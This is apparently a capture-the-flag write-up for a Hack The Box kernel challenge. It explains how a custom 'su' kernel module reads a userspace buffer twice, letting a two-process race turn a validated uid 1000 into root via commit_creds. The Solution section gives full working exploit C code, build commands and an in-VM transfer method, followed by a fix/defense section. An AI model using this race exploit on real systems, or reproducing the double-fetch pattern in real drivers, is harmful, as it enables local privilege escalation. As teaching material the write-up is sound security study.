---
title: "Kernel Adventures: Part 1"
date: 2027-12-10 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, kernel, double-fetch, race-condition, toctou, commit-creds, privilege-escalation]
description: "A Medium kernel-pwn challenge: a custom su-in-the-kernel module reads the userspace request buffer multiple times instead of copying it once, so a two-thread race validates a normal user but commits root. No memory corruption — just a double-fetch flipped into commit_creds(uid=0)."
---

## Overview

**Kernel Adventures: Part 1** is a Medium [Pwn](https://www.hackthebox.com/) challenge. It ships a bootable mini-Linux (`bzImage`, `rootfs.cpio.gz`, a QEMU `run.sh`) that drops you in as an unprivileged user and loads a custom module, `mysu.ko` — "su, but in the kernel." The module reads the caller's userspace buffer more than once without copying it, a [double-fetch race condition](https://cwe.mitre.org/data/definitions/367.html) that turns directly into root via `commit_creds()`. No memory-corruption primitive is required.

## The technique

Boot runs the module world-writable and hands you a uid-1000 shell:

```sh
insmod mysu.ko
chmod 666 /dev/mysu
setsid cttyhack setuidgid 1000 sh
```

Disassembling `dev_write` (the handler behind `write(fd, buf, count)`), the buffer is the **raw userspace pointer** — there is no `copy_from_user`:

```c
ssize_t dev_write(struct file *f, const char __user *buf, size_t n, loff_t *o) {
    if (n <= 7) return 0;
    u32 uid = *(u32*)buf;                 // FETCH 1: choose which stored hash to check
    if (uid == 1000 && hash(buf+4) == stored_hash_1000) goto grant;
    /* ... uid == 1001 branch, with a second *(u32*)buf re-read ... */
grant:
    u32 grant_uid = *(u32*)buf;           // FETCH 3: re-read user memory
    struct cred *c = prepare_creds();
    c->uid = c->gid = /* ... */ = grant_uid;   // creds := buf[0]
    commit_creds(c);
    return n;
}
```

`buf[0]` is read once to pick which stored password hash to validate, and read **again** at grant time to pick which uid to become. Those two reads can return different values. The password at `buf+4` is checked with a custom **Jenkins one-at-a-time** hash (recognisable by the per-byte `h += c; h += h<<10; h ^= h>>6; h ^= c`). Locally the module ships stored hashes of `0`, and `hash("") == 0`, so an empty password passes during development; on the live instance the hash is non-zero, so a cracked preimage for uid 1000 is supplied.

The race: keep `buf[0] = 1000` so the check passes, then flip it to `0` before fetch 3, and `commit_creds()` installs uid 0.

## Solution

Two contexts share one buffer and hammer `write()` — one holds the valid uid, one sets root and polls `getuid()`. Building it freestanding (no libc, raw syscalls) yields a ~13 KB static binary that base64-encodes to ~1 KB, which matters for pasting over the cramped in-VM shell.

Create `tiny.c`:

```c
#define O_RDWR 2
#define MAP_SHARED 0x01
#define MAP_ANON  0x20
#define PROT_RW   0x3
static long sys(long n,long a,long b,long c,long d,long e,long f){
    long ret; register long r10 asm("r10")=d,r8 asm("r8")=e,r9 asm("r9")=f;
    asm volatile("syscall":"=a"(ret):"a"(n),"D"(a),"S"(b),"d"(c),"r"(r10),"r"(r8),"r"(r9):"rcx","r11","memory");
    return ret;
}
void _start(void){
    volatile unsigned char *buf=(void*)sys(9,0,4096,PROT_RW,MAP_SHARED|MAP_ANON,-1,0);   // mmap
    long fd=sys(2,(long)"/dev/mysu",O_RDWR,0,0,0,0);                                       // open
    *(volatile unsigned int*)buf=1000;
    buf[4]=0x6e;buf[5]=0x63;buf[6]=0x7b;buf[7]=0x89;buf[8]=0;                              // uid1000 password preimage
    long wlen=9;                                                                            // module needs count>7
    long pid=sys(57,0,0,0,0,0,0);                                                          // fork
    if(pid==0){ while(1){ *(volatile unsigned int*)buf=0;    sys(1,fd,(long)buf,wlen,0,0,0); if(!sys(102,0,0,0,0,0,0))break; } }
    else       { while(1){ *(volatile unsigned int*)buf=1000; sys(1,fd,(long)buf,wlen,0,0,0); if(!sys(102,0,0,0,0,0,0))break; } }
    if(!sys(102,0,0,0,0,0,0)){ char*av[]={"/bin/sh","-c","cat /flag",0}; sys(59,(long)av[0],(long)av,0,0,0,0); }
    sys(60,0,0,0,0,0,0);
}
```

Build and transfer. `MAP_SHARED` is mandatory so both forked processes race the *same* bytes:

```sh
gcc -nostdlib -static -O2 -o x tiny.c
gzip -9c x | base64 -w0
```

The VM's BusyBox tty runs canonical-mode input with a ~1024-byte line limit, so echoing the whole base64 on one line silently truncates it and the decoded binary is corrupt. Append it in small chunks instead:

```sh
printf %s <chunk> >> x.b64      # repeat for each <=180-char chunk
base64 -d x.b64 | gzip -d > x
chmod +x x
./x
```

The winning process becomes root and `execve`s `cat /flag`, printing `HTB{...}` in well under a second.

## Why it worked

The kernel trusted a userspace address across multiple dereferences: it validated the value read at fetch 1 but acted on the value read at fetch 3. A concurrent thread mutated the shared page in between. The password hash and the length gate only decide *whether* you reach the grant path — not *which* uid you receive once there.

## Fix / defense

- **Copy once, then use the copy.** `copy_from_user(&k, buf, sizeof(k))` into a kernel-local struct, then validate and act on `k` exclusively — never re-dereference the `__user` pointer for a security decision.
- A mutex around the handler does not fix a double-fetch on its own; the single kernel copy is the real fix.
- Don't roll a custom hash for password storage, and never ship a build with the stored hash left at 0.
